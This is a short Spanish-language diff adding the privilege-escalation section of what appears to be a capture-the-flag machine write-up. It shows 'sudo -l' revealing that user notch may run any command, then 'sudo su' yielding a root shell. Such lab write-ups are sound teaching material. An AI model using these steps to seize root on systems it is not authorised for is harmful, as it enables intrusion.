@@ -1,0 +1,20 @@
+## Privilege Escalation {-}
+
+### Rootear la maquina {-}
+
+```bash
+sudo -l
+#Output
+(ALL : ALL) ALL
+```
+
+Vemos que el usuario notch puede effectuar qualquier commando como qualquier usuario ;)
+
+```bash
+sudo su
+whoami
+
+root
+```
+
+Ya esta ;)
